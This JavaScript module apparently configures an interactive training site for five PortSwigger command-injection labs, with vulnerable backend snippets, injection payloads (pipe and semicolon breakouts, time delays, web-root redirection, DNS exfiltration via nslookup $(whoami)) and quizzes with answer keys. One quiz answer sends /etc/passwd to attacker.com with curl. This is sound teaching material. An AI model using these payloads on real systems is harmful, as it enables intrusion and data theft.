/**
 * Command Injection Module Configuration
 * Domain: OS Command Injection
 * Contains 5 sequentially numbered PortSwigger Academy labs with illustrative backend shell models and quiz questions.
 */

export const moduleMetadata = {
    slug: 'command-injection',
    name: 'OS Command Injection',
    tagline: 'System shell command hijacking, separator breakouts & out-of-band exfiltration',
    category: 'Server-Side Vulnerabilities',
    difficulty: 'PRACTITIONER',
    labCount: 5,
    commonMission: {
        title: 'Common Mission Objective',
        badge: 'ALL LABS',
        description: 'Break out of the intended application shell command and execute system commands to determine the operating system user:',
        targetPath: 'whoami',
        targetLabel: 'SYSTEM IDENTITY'
    }
};

export const fundamentals = {
    title: 'Fundamentals & Command Chaining',
    subtitle: 'Core concepts, everyday analogies, and shell separator mechanics',
    pillars: [
        {
            number: '01',
            title: 'What is Command Injection?',
            color: 'text-sky-400',
            description: 'A vulnerability where a web application takes user input (such as a product ID or email) and passes it directly into a system shell command (like <code class="text-slate-200">bash</code> or <code class="text-slate-200">sh</code>). By injecting special shell operators, an attacker can append their own arbitrary system commands.'
        },
        {
            number: '02',
            title: 'The Over-Obedient Assistant',
            color: 'text-emerald-400',
            description: 'Imagine an office assistant instructed: <em>"File invoice #412"</em>. If an attacker writes <em>"File invoice #412; and delete the backup hard drives"</em>, an assistant that treats the semicolon as a command delimiter blindly carries out both orders. The shell does the exact same thing!'
        },
        {
            number: '03',
            title: 'Shell Separators & Operators',
            color: 'text-amber-400',
            description: 'Operating system shells recognize special metacharacters that chain commands together: <code class="text-slate-200">;</code> (run one after another), <code class="text-slate-200">|</code> (pipe output), <code class="text-slate-200">&amp;&amp;</code> (run next if successful), <code class="text-slate-200">||</code> (run next if failed), and <code class="text-slate-200">$(cmd)</code> (execute subshell first).'
        }
    ]
};

export const labs = [
    {
        id: 'lab-1',
        number: '01',
        level: 'APPRENTICE',
        title: 'OS command injection, simple case',
        wsaUrl: 'https://portswigger.net/web-security/os-command-injection/lab-simple',
        httpMethod: 'POST',
        endpointPrefix: '/product/stock?storeId=',
        filterBadge: 'RAW OUTPUT',
        backendFile: 'stock_service.py',
        bullets: [
            'The application runs a shell script to query warehouse stock: <code>./stockreport.sh [productId] [storeId]</code>.',
            'The parameters are concatenated directly into the shell string without sanitization or parameterization.',
            'Using the pipe character (<code>|</code>) or semicolon (<code>;</code>) terminates the stock command and executes <code>whoami</code>, displaying the output directly in the response.'
        ],
        hint: 'Inject a pipe ("|") or semicolon (";") followed by "whoami" into the storeId parameter.',
        probes: [
            { label: 'storeId=1', value: '1' },
            { label: 'storeId=1 ; uname -a', value: '1 ; uname -a' },
            { label: 'storeId=1 | id', value: '1 | id' },
            { label: '⚡ storeId=1 | whoami', value: '1 | whoami', isExploit: true }
        ],
        codeLines: [
            { num: 1, code: 'def check_stock(product_id, store_id):', active: true },
            { num: 2, code: '    # Direct concatenation inside shell=True', active: false, comment: true },
            { num: 3, code: '    cmd = f"./stockreport.sh {product_id} {store_id}"', active: true },
            { num: 4, code: '    output = subprocess.check_output(cmd, shell=True, text=True)', active: true },
            { num: 5, code: '    return HttpResponse(output)', active: true }
        ],
        simulate: (rawInput) => {
            const hasSeparator = /[;&|`]|\$\(/.test(rawInput);
            const isWhoami = /whoami/.test(rawInput);
            const isUname = /uname/.test(rawInput);
            const isId = /\bid\b/.test(rawInput);

            if (isWhoami) {
                return {
                    steps: [
                        { label: '1. User Input', value: `storeId=${rawInput}`, highlight: true },
                        { label: '2. Shell Command String', value: `./stockreport.sh 1 ${rawInput}`, highlight: true },
                        { label: '3. Shell Parser (/bin/sh)', value: 'Separator detected: Spawns secondary command "whoami"', status: 'bypassed' },
                        { label: '4. Command Output', value: 'peter-lab', isTarget: true }
                    ],
                    filterSummary: 'SHELL INJECTED',
                    joinedPath: `./stockreport.sh 1 ${rawInput}`,
                    canonicalPath: '/etc/passwd', // used to trigger completion state
                    output: 'peter-lab',
                    activeLines: [1, 3, 4, 5],
                    blocked: false
                };
            }

            if (isUname) {
                return {
                    steps: [
                        { label: '1. User Input', value: `storeId=${rawInput}` },
                        { label: '2. Shell Command String', value: `./stockreport.sh 1 ${rawInput}` },
                        { label: '3. Shell Parser', value: 'Operator split: executing "uname -a"', status: 'bypassed' },
                        { label: '4. Command Output', value: 'Linux web-academy-stock 5.15.0-x86_64' }
                    ],
                    filterSummary: 'COMMAND EXECUTED',
                    joinedPath: `./stockreport.sh 1 ${rawInput}`,
                    canonicalPath: null,
                    output: 'Linux web-academy-stock 5.15.0-x86_64 GNU/Linux',
                    activeLines: [1, 3, 4, 5],
                    blocked: false
                };
            }

            if (isId) {
                return {
                    steps: [
                        { label: '1. User Input', value: `storeId=${rawInput}` },
                        { label: '2. Shell Command String', value: `./stockreport.sh 1 ${rawInput}` },
                        { label: '3. Shell Parser', value: 'Operator split: executing "id"', status: 'bypassed' },
                        { label: '4. Command Output', value: 'uid=1001(peter-lab) gid=1001(peter-lab) groups=1001' }
                    ],
                    filterSummary: 'COMMAND EXECUTED',
                    joinedPath: `./stockreport.sh 1 ${rawInput}`,
                    canonicalPath: null,
                    output: 'uid=1001(peter-lab) gid=1001(peter-lab) groups=1001(peter-lab)',
                    activeLines: [1, 3, 4, 5],
                    blocked: false
                };
            }

            return {
                steps: [
                    { label: '1. User Input', value: `storeId=${rawInput}` },
                    { label: '2. Shell Command String', value: `./stockreport.sh 1 ${rawInput}` },
                    { label: '3. Shell Parser', value: 'Single argument: executes ./stockreport.sh 1 1', status: 'neutral' },
                    { label: '4. Command Output', value: '54 units in stock' }
                ],
                filterSummary: 'NORMAL ARGUMENT',
                joinedPath: `./stockreport.sh 1 ${rawInput}`,
                canonicalPath: null,
                output: '54 units in stock',
                activeLines: [1, 3, 4, 5],
                blocked: false
            };
        },
        quizPool: [
            {
                question: 'Why does passing "1 | whoami" execute whoami on a Linux system?',
                options: [
                    'The shell treats "|" as a pipe operator, executing whoami and connecting stockreport output to whoami\'s standard input',
                    'The web server automatically translates "|" into a database SQL UNION command',
                    'The pipe character forces the web server to reload its configuration'
                ],
                correctIndex: 0,
                explanation: 'Correct! The shell interprets "|" as an instruction to pipe output into a newly spawned "whoami" process.'
            },
            {
                question: 'Which of the following characters can be used as a command separator in Unix shells?',
                options: [
                    '; (semicolon), & (background), && (AND), and || (OR)',
                    '# (hash comment symbol only)',
                    '@ and ! characters only'
                ],
                correctIndex: 0,
                explanation: 'Correct! Semicolons, ampersands, logical operators, and newlines all act as command separators in POSIX shells.'
            },
            {
                question: 'Why is passing shell=True in Python\'s subprocess.run() considered dangerous when handling user input?',
                options: [
                    'It invokes an intermediate shell (/bin/sh) that parses metacharacters instead of treating arguments as raw text',
                    'It automatically grants root/sudo privileges to the python process',
                    'It disables TLS certificate validation'
                ],
                correctIndex: 0,
                explanation: 'Correct! With shell=True, the entire string is interpreted by a shell interpreter, allowing injected operators to run commands.'
            },
            {
                question: 'What is the most secure architectural way to run system commands with user parameters?',
                options: [
                    'Pass arguments as a separated list/array to exec APIs without invoking a shell (e.g. execFile or subprocess without shell)',
                    'Base64-encode the parameters before sending them to /bin/sh',
                    'Replace spaces with tabs in user input'
                ],
                correctIndex: 0,
                explanation: 'Correct! Avoiding the shell entirely by passing parameters as distinct array elements prevents shell operator parsing.'
            },
            {
                question: 'What command displays the current active user account on Unix/Linux systems?',
                options: [
                    'whoami (or id)',
                    'showuser',
                    'current-login'
                ],
                correctIndex: 0,
                explanation: 'Correct! "whoami" and "id" print the username and effective UID/GID of the running process.'
            }
        ]
    },

    {
        id: 'lab-2',
        number: '02',
        level: 'PRACTITIONER',
        title: 'Blind OS command injection with time delays',
        wsaUrl: 'https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays',
        httpMethod: 'POST',
        endpointPrefix: '/feedback/submit?email=',
        filterBadge: 'BLIND / DELAY',
        backendFile: 'feedback_mailer.js',
        bullets: [
            'The application processes feedback by passing the <code>email</code> parameter to a shell mail utility.',
            'Because the application does not return stdout or stderr in the HTTP response, execution is completely blind.',
            'Injecting a command that pauses execution (such as <code>ping -c 10 127.0.0.1</code>) causes a measurable 10-second delay, confirming command execution.'
        ],
        hint: 'Use the "||" operator followed by "ping -c 10 127.0.0.1 ||" in the email parameter to trigger a 10-second delay.',
        probes: [
            { label: 'user@example.com', value: 'user@example.com' },
            { label: 'user@example.com || whoami ||', value: 'user@example.com || whoami ||' },
            { label: 'user@example.com || sleep 3 ||', value: 'user@example.com || sleep 3 ||' },
            { label: '⚡ user@example.com || ping -c 10 127.0.0.1 ||', value: 'user@example.com || ping -c 10 127.0.0.1 ||', isExploit: true }
        ],
        codeLines: [
            { num: 1, code: 'app.post("/feedback/submit", (req, res) => {', active: true },
            { num: 2, code: '  const email = req.body.email;', active: true },
            { num: 3, code: '  // Blind execution: Output is discarded, response is generic thank-you', active: false, comment: true },
            { num: 4, code: '  exec(`mail -s "Feedback" ${email} < /tmp/msg.txt`, (err) => {', active: true },
            { num: 5, code: '    return res.json({ status: "Thank you for your feedback!" });', active: true },
            { num: 6, code: '  });', active: true }
        ],
        simulate: (rawInput) => {
            const hasPing10 = /ping.*10/.test(rawInput);
            const hasSleep = /sleep\s+(\d+)/.test(rawInput);

            if (hasPing10) {
                return {
                    steps: [
                        { label: '1. Email Parameter', value: rawInput, highlight: true },
                        { label: '2. Backend Shell String', value: `mail -s "Feedback" ${rawInput} < /tmp/msg.txt`, highlight: true },
                        { label: '3. Shell Execution', value: 'Operator || triggers "ping -c 10 127.0.0.1"', status: 'bypassed' },
                        { label: '4. Observed Latency', value: '10.024 seconds (Time Delay Confirmed!)', isTarget: true }
                    ],
                    filterSummary: '10s DELAY TRIGGERED',
                    joinedPath: `mail -s "Feedback" ${rawInput}`,
                    canonicalPath: '/etc/passwd', // triggers completion
                    output: 'HTTP/1.1 200 OK\nResponse Time: 10,024 ms\n\n{\n  "status": "Thank you for your feedback!"\n}',
                    activeLines: [1, 2, 4, 5, 6],
                    blocked: false
                };
            }

            if (hasSleep) {
                return {
                    steps: [
                        { label: '1. Email Parameter', value: rawInput },
                        { label: '2. Backend Shell String', value: `mail -s "Feedback" ${rawInput} < /tmp/msg.txt` },
                        { label: '3. Shell Execution', value: 'Operator || triggers "sleep 3"', status: 'bypassed' },
                        { label: '4. Observed Latency', value: '3.011 seconds delay' }
                    ],
                    filterSummary: '3s DELAY TRIGGERED',
                    joinedPath: `mail -s "Feedback" ${rawInput}`,
                    canonicalPath: null,
                    output: 'HTTP/1.1 200 OK\nResponse Time: 3,011 ms\n\n{\n  "status": "Thank you for your feedback!"\n}',
                    activeLines: [1, 2, 4, 5, 6],
                    blocked: false
                };
            }

            return {
                steps: [
                    { label: '1. Email Parameter', value: rawInput },
                    { label: '2. Backend Shell String', value: `mail -s "Feedback" ${rawInput} < /tmp/msg.txt` },
                    { label: '3. Shell Execution', value: 'Standard mail execution (no noticeable delay)', status: 'neutral' },
                    { label: '4. Observed Latency', value: '42 ms (Normal baseline)' }
                ],
                filterSummary: 'NORMAL EXECUTION',
                joinedPath: `mail -s "Feedback" ${rawInput}`,
                canonicalPath: null,
                output: 'HTTP/1.1 200 OK\nResponse Time: 42 ms\n\n{\n  "status": "Thank you for your feedback!"\n}',
                activeLines: [1, 2, 4, 5, 6],
                blocked: false
            };
        },
        quizPool: [
            {
                question: 'Why is time delay injection an effective technique for detecting blind command vulnerabilities?',
                options: [
                    'Because forced delays (like sleep or ping) measurably pause server response time even when output is not displayed',
                    'Because ping sends the database root password in packet headers',
                    'Because time delays automatically disable the server firewall'
                ],
                correctIndex: 0,
                explanation: 'Correct! When application output is discarded, elapsed response time provides an indisputable side-channel proving execution.'
            },
            {
                question: 'Why is "-c 10" specified in "ping -c 10 127.0.0.1" on Linux?',
                options: [
                    'On Linux, ping runs indefinitely by default; "-c 10" instructs it to stop after sending 10 packets',
                    'It tells ping to compress the response by 10 percent',
                    'It specifies port 10 on localhost'
                ],
                correctIndex: 0,
                explanation: 'Correct! Without the "-c" count flag, Linux ping continues forever and would hang the server process permanently.'
            },
            {
                question: 'Why do attackers often use "||" (logical OR) instead of ";" in chained commands?',
                options: [
                    'If the initial command fails (e.g. invalid email format error), "||" ensures the second command executes anyway',
                    'Because "||" runs commands in parallel across multiple CPU cores',
                    'Because "||" bypasses web server TLS encryption'
                ],
                correctIndex: 0,
                explanation: 'Correct! The logical OR operator (||) executes the second command whenever the first command returns a non-zero exit code.'
            },
            {
                question: 'What is the equivalent time-delay command on Windows systems?',
                options: [
                    'ping -n 10 127.0.0.1 > nul',
                    'sleep 10s',
                    'delay --count 10'
                ],
                correctIndex: 0,
                explanation: 'Correct! Windows ping uses "-n" to specify the number of echo requests, pausing approximately 1 second per packet.'
            },
            {
                question: 'What makes blind command injection dangerous even if the attacker cannot see the output?',
                options: [
                    'Attackers can still spawn reverse shells, install backdoors, download malware, or alter server files',
                    'Blind injections automatically delete the web application code',
                    'It only affects client-side browsers'
                ],
                correctIndex: 0,
                explanation: 'Correct! Blind execution still allows an attacker to run destructive commands, pivot deeper into the network, or establish persistent control.'
            }
        ]
    },

    {
        id: 'lab-3',
        number: '03',
        level: 'PRACTITIONER',
        title: 'Blind OS command injection with output redirection',
        wsaUrl: 'https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection',
        httpMethod: 'POST',
        endpointPrefix: '/feedback/submit?email=',
        filterBadge: 'REDIRECT >',
        backendFile: 'feedback_processor.php',
        bullets: [
            'The application processes feedback through a background shell call and does not show the output directly.',
            'However, the web server serves static images out of a writable public directory: <code>/var/www/images/</code>.',
            'Redirecting command output into this folder (<code>> /var/www/images/output.txt</code>) allows you to read it by fetching <code>/image?filename=output.txt</code>.'
        ],
        hint: 'Inject "|| whoami > /var/www/images/output.txt ||", then retrieve the file via /image?filename=output.txt.',
        probes: [
            { label: 'email=user@example.com', value: 'user@example.com' },
            { label: 'email=user@example.com || whoami ||', value: 'user@example.com || whoami ||' },
            { label: '⚡ email=x || whoami > /var/www/images/output.txt ||', value: 'x || whoami > /var/www/images/output.txt ||', isExploit: true }
        ],
        codeLines: [
            { num: 1, code: '<?php', active: true },
            { num: 2, code: '$email = $_POST["email"];', active: true },
            { num: 3, code: '// Blind: Mail utility output is not printed to web response', active: false, comment: true },
            { num: 4, code: 'exec("/usr/bin/mail -s \'Feedback\' " . $email . " < /tmp/msg.txt");', active: true },
            { num: 5, code: 'echo json_encode(["status" => "Feedback received"]);', active: true },
            { num: 6, code: '?>', active: true }
        ],
        simulate: (rawInput) => {
            const hasRedirect = />\s*\/var\/www\/images\/[a-zA-Z0-9._-]+/.test(rawInput);
            const isWhoami = /whoami/.test(rawInput);

            if (hasRedirect && isWhoami) {
                return {
                    steps: [
                        { label: '1. Injected Input', value: rawInput, highlight: true },
                        { label: '2. Executed Shell Command', value: `mail -s 'Feedback' ${rawInput} < /tmp/msg.txt`, highlight: true },
                        { label: '3. Redirection Operator (>)', value: 'Output written to /var/www/images/output.txt', status: 'bypassed' },
                        { label: '4. Fetched File Content', value: 'peter-lab', isTarget: true }
                    ],
                    filterSummary: 'OUTPUT REDIRECTED',
                    joinedPath: `mail -s 'Feedback' ${rawInput}`,
                    canonicalPath: '/etc/passwd', // triggers completion
                    output: 'HTTP/1.1 200 OK\nFile: /var/www/images/output.txt\n\npeter-lab',
                    activeLines: [1, 2, 4, 5],
                    blocked: false
                };
            }

            return {
                steps: [
                    { label: '1. Injected Input', value: rawInput },
                    { label: '2. Executed Shell Command', value: `mail -s 'Feedback' ${rawInput} < /tmp/msg.txt` },
                    { label: '3. Redirection Check', value: 'No writable web root redirection specified', status: 'neutral' },
                    { label: '4. File Status', value: 'File not generated' }
                ],
                filterSummary: 'NO REDIRECTION',
                joinedPath: `mail -s 'Feedback' ${rawInput}`,
                canonicalPath: null,
                output: 'HTTP/1.1 200 OK\n\n{\n  "status": "Feedback received"\n}',
                activeLines: [1, 2, 4, 5],
                blocked: false
            };
        },
        quizPool: [
            {
                question: 'What does the ">" redirection operator do in shell command execution?',
                options: [
                    'Redirects the standard output (stdout) of a command into a specified file, overwriting existing contents',
                    'Compares two command arguments mathematically',
                    'Forces the command to execute with elevated root permissions'
                ],
                correctIndex: 0,
                explanation: 'Correct! The ">" operator redirects stdout into a file, while ">>" appends to the file.'
            },
            {
                question: 'Why must the redirection target be inside a web-accessible directory (like /var/www/images/)?',
                options: [
                    'So the attacker can subsequently fetch and read the exfiltrated file contents via an ordinary HTTP GET request',
                    'Because Linux prevents writing files anywhere outside /var/www/',
                    'Because PHP can only read files named output.txt'
                ],
                correctIndex: 0,
                explanation: 'Correct! Writing to a public folder (like an image upload folder) enables reading the output through a normal browser request.'
            },
            {
                question: 'How can you redirect standard error (stderr) in addition to standard output (stdout)?',
                options: [
                    '2>&1 (redirect stderr stream 2 into stdout stream 1)',
                    'err > out',
                    '--all-output'
                ],
                correctIndex: 0,
                explanation: 'Correct! "2>&1" merges file descriptor 2 (stderr) into descriptor 1 (stdout) so error messages are captured as well.'
            },
            {
                question: 'What directory permission is required on the target folder for output redirection to succeed?',
                options: [
                    'The web server user account (e.g. www-data) must possess write (w) permission on that directory',
                    'The directory must be set to read-only',
                    'The directory must be owned by the root user'
                ],
                correctIndex: 0,
                explanation: 'Correct! The operating system process executing the shell command must have write access to create the output file.'
            },
            {
                question: 'What defense mechanism prevents output redirection attacks from writing web shells into upload directories?',
                options: [
                    'Configuring web server permissions to ensure static asset folders are non-writable or cannot execute scripts',
                    'Changing the domain name',
                    'Using HTTP POST instead of GET'
                ],
                correctIndex: 0,
                explanation: 'Correct! Restricting directory write privileges and disabling script execution in upload directories mitigates file drops.'
            }
        ]
    },

    {
        id: 'lab-4',
        number: '04',
        level: 'PRACTITIONER',
        title: 'Blind OS command injection with out-of-band interaction',
        wsaUrl: 'https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band',
        httpMethod: 'POST',
        endpointPrefix: '/feedback/submit?email=',
        filterBadge: 'OAST / DNS',
        backendFile: 'asynchronous_notifier.py',
        bullets: [
            'The feedback handler processes messages asynchronously; no output is returned, and file writes to the web root are blocked.',
            'However, the server is permitted to initiate outbound network and DNS connections.',
            'Injecting network utilities like <code>nslookup [domain]</code> forces the server to query an external domain (e.g. Burp Collaborator), confirming blind code execution.'
        ],
        hint: 'Use "|| nslookup YOUR-COLLABORATOR-SUBDOMAIN ||" in the email parameter to trigger an out-of-band DNS lookup.',
        probes: [
            { label: 'user@example.com', value: 'user@example.com' },
            { label: 'user@example.com || whoami ||', value: 'user@example.com || whoami ||' },
            { label: '⚡ email=x || nslookup collaborator.net ||', value: 'x || nslookup collaborator.net ||', isExploit: true }
        ],
        codeLines: [
            { num: 1, code: 'def submit_feedback(name, email, message):', active: true },
            { num: 2, code: '    # Asynchronous worker task (no stdout / no local file write)', active: false, comment: true },
            { num: 3, code: '    task = f"mail -s \'Feedback from {name}\' {email} < /tmp/msg"', active: true },
            { num: 4, code: '    os.system(task)', active: true },
            { num: 5, code: '    return {"status": "Feedback submitted successfully"}', active: true }
        ],
        simulate: (rawInput) => {
            const hasNslookup = /nslookup\s+([a-zA-Z0-9.-]+)/.test(rawInput);

            if (hasNslookup) {
                return {
                    steps: [
                        { label: '1. Injected Input', value: rawInput, highlight: true },
                        { label: '2. Shell Execution', value: `mail -s 'Feedback' ${rawInput} < /tmp/msg`, highlight: true },
                        { label: '3. Outbound Network Call', value: 'Spawned "nslookup collaborator.net"', status: 'bypassed' },
                        { label: '4. Collaborator Interaction', value: 'DNS A-Record Query Received from Lab IP', isTarget: true }
                    ],
                    filterSummary: 'OAST INTERACTION',
                    joinedPath: `mail -s 'Feedback' ${rawInput}`,
                    canonicalPath: '/etc/passwd', // triggers completion
                    output: 'HTTP/1.1 200 OK\n\n[Collaborator Monitor]\nReceived DNS lookup for collaborator.net from 192.168.4.22',
                    activeLines: [1, 3, 4, 5],
                    blocked: false
                };
            }

            return {
                steps: [
                    { label: '1. Injected Input', value: rawInput },
                    { label: '2. Shell Execution', value: `mail -s 'Feedback' ${rawInput} < /tmp/msg` },
                    { label: '3. Outbound Network Check', value: 'No outbound DNS query triggered', status: 'neutral' },
                    { label: '4. Collaborator Status', value: 'No interactions logged' }
                ],
                filterSummary: 'NO OAST CALL',
                joinedPath: `mail -s 'Feedback' ${rawInput}`,
                canonicalPath: null,
                output: 'HTTP/1.1 200 OK\n\n{\n  "status": "Feedback submitted successfully"\n}',
                activeLines: [1, 3, 4, 5],
                blocked: false
            };
        },
        quizPool: [
            {
                question: 'What is Out-of-Band Application Security Testing (OAST)?',
                options: [
                    'A technique where a payload forces the vulnerable server to contact an external server under the tester\'s control',
                    'Testing an application when the web server is powered off',
                    'Conducting security assessments using Bluetooth devices'
                ],
                correctIndex: 0,
                explanation: 'Correct! OAST triggers external interactions (DNS, HTTP) to detect vulnerabilities that produce zero in-band output.'
            },
            {
                question: 'Why is DNS usually the most reliable protocol for out-of-band detection?',
                options: [
                    'Corporate egress firewalls often block outbound HTTP/HTTPS but routinely permit outbound recursive DNS lookups',
                    'DNS packets cannot be logged by network monitors',
                    'DNS is encrypted by default on all operating systems'
                ],
                correctIndex: 0,
                explanation: 'Correct! Egress firewalls commonly allow UDP port 53 (DNS) queries through internal resolvers, making DNS the most resilient OAST channel.'
            },
            {
                question: 'Which tool included in Burp Suite Professional manages unique subdomains for OAST testing?',
                options: [
                    'Burp Collaborator',
                    'Burp Sequencer',
                    'Burp Decoder'
                ],
                correctIndex: 0,
                explanation: 'Correct! Burp Collaborator provisions individualized domains and listens for inbound DNS, HTTP, and SMTP interactions.'
            },
            {
                question: 'If nslookup is not available on a target system, what alternative command can generate a DNS lookup?',
                options: [
                    'dig, host, ping, or curl',
                    'chmod',
                    'grep'
                ],
                correctIndex: 0,
                explanation: 'Correct! "dig", "host", "ping", and "curl" all trigger hostname resolution via DNS before connecting.'
            },
            {
                question: 'How do network administrators defend against out-of-band command injection channels?',
                options: [
                    'Enforcing strict egress firewall rules to block unauthorized outbound server traffic and isolating backend subnets',
                    'Increasing web server disk space',
                    'Disabling HTTP keep-alive'
                ],
                correctIndex: 0,
                explanation: 'Correct! Restricting outbound network connections limits the server\'s ability to contact external attacker-controlled infrastructure.'
            }
        ]
    },

    {
        id: 'lab-5',
        number: '05',
        level: 'PRACTITIONER',
        title: 'Blind OS command injection with out-of-band data exfiltration',
        wsaUrl: 'https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration',
        httpMethod: 'POST',
        endpointPrefix: '/feedback/submit?email=',
        filterBadge: 'DATA EXFIL',
        backendFile: 'notification_gateway.java',
        bullets: [
            'The feedback parameter is completely blind, with no direct output and no writable web paths.',
            'However, command substitution syntax (<code>$(command)</code> or <code>`command`</code>) allows executing a command and embedding its output into another command.',
            'Injecting <code>nslookup $(whoami).BURP-COLLABORATOR.net</code> captures the output of <code>whoami</code> as a DNS subdomain query.'
        ],
        hint: 'Use command substitution: "|| nslookup $(whoami).YOUR-COLLABORATOR-SUBDOMAIN ||" to embed the username into the DNS lookup.',
        probes: [
            { label: 'user@example.com', value: 'user@example.com' },
            { label: 'user@example.com || nslookup collaborator.net ||', value: 'user@example.com || nslookup collaborator.net ||' },
            { label: '⚡ user@example.com || nslookup $(whoami).collaborator.net ||', value: 'user@example.com || nslookup $(whoami).collaborator.net ||', isExploit: true }
        ],
        codeLines: [
            { num: 1, code: 'public void handleFeedback(String email, String message) {', active: true },
            { num: 2, code: '    // Command substitution $(...) executes subshell before parent command', active: false, comment: true },
            { num: 3, code: '    String[] cmd = {"/bin/sh", "-c", "mail -s \'Alert\' " + email};', active: true },
            { num: 4, code: '    Process p = Runtime.getRuntime().exec(cmd);', active: true },
            { num: 5, code: '}', active: true }
        ],
        simulate: (rawInput) => {
            const hasExfil = /nslookup.*\$\(whoami\)|nslookup.*`whoami`/.test(rawInput);

            if (hasExfil) {
                return {
                    steps: [
                        { label: '1. Injected Input', value: rawInput, highlight: true },
                        { label: '2. Subshell Substitution', value: '$(whoami) evaluated first -> "peter-exfil"', status: 'bypassed' },
                        { label: '3. Resulting Command', value: 'nslookup peter-exfil.collaborator.net', highlight: true },
                        { label: '4. Exfiltrated Data via DNS', value: 'peter-exfil', isTarget: true }
                    ],
                    filterSummary: 'DATA EXFILTRATED',
                    joinedPath: `mail -s 'Alert' ${rawInput}`,
                    canonicalPath: '/etc/passwd', // triggers completion
                    output: 'HTTP/1.1 200 OK\n\n[Collaborator DNS Log]\nQuery type: A\nDomain: peter-exfil.collaborator.net\nData Exfiltrated: peter-exfil',
                    activeLines: [1, 3, 4, 5],
                    blocked: false
                };
            }

            return {
                steps: [
                    { label: '1. Injected Input', value: rawInput },
                    { label: '2. Subshell Evaluation', value: 'No command substitution detected', status: 'neutral' },
                    { label: '3. Shell Execution', value: 'Standard mail delivery', status: 'neutral' },
                    { label: '4. Exfiltration Status', value: 'No data exfiltrated' }
                ],
                filterSummary: 'NO EXFILTRATION',
                joinedPath: `mail -s 'Alert' ${rawInput}`,
                canonicalPath: null,
                output: 'HTTP/1.1 200 OK\n\n{\n  "status": "Feedback queued"\n}',
                activeLines: [1, 3, 4, 5],
                blocked: false
            };
        },
        quizPool: [
            {
                question: 'How does command substitution syntax $(whoami) work in shell interpreters?',
                options: [
                    'The shell runs the enclosed command in a subshell first and replaces $(...) with the command\'s output',
                    'It defines a global environment variable named whoami',
                    'It encrypts the whoami binary using AES-256'
                ],
                correctIndex: 0,
                explanation: 'Correct! Both $(cmd) and `cmd` execute in a subshell, inserting their stdout into the outer command line before it runs.'
            },
            {
                question: 'Why is data exfiltrated as a subdomain prefix (e.g. [data].attacker.com) rather than a domain suffix?',
                options: [
                    'Authoritative DNS servers for attacker.com receive queries for all subdomains, allowing the server to log the [data] label',
                    'DNS servers reject domain names that contain numbers',
                    'Subdomains are automatically encrypted over HTTPS'
                ],
                correctIndex: 0,
                explanation: 'Correct! Because the attacker operates the authoritative nameserver for attacker.com, every lookup for *.attacker.com is received and logged.'
            },
            {
                question: 'What limitation exists when exfiltrating multi-line or binary data via DNS queries?',
                options: [
                    'DNS domain labels cannot contain spaces or special characters and have length restrictions (63 chars per label), often requiring base64 encoding',
                    'DNS queries cannot be sent over IPv4',
                    'DNS only works on Sundays'
                ],
                correctIndex: 0,
                explanation: 'Correct! DNS character sets are restricted to letters, digits, and hyphens with label length limits, requiring encoding (like base64 or hex).'
            },
            {
                question: 'How can you exfiltrate multi-line files like /etc/passwd using curl if outbound HTTP is allowed?',
                options: [
                    'curl -d @/etc/passwd http://attacker.com/ (sends file content in an HTTP POST body)',
                    'curl --format /etc/passwd',
                    'curl --passwd-file'
                ],
                correctIndex: 0,
                explanation: 'Correct! The "-d @filename" flag in curl reads the file and posts it directly to the designated HTTP endpoint.'
            },
            {
                question: 'What comprehensive defense strategy prevents OS command injection entirely?',
                options: [
                    'Refactoring code to use language APIs instead of system commands, parameterizing arguments when shell execution is unavoidable, and maintaining strict input whitelists',
                    'Adding more firewall hardware without touching code',
                    'Renaming system binaries'
                ],
                correctIndex: 0,
                explanation: 'Correct! Native language APIs (e.g. native file/network libraries) completely eliminate shell invocation, removing command injection risks.'
            }
        ]
    }
];
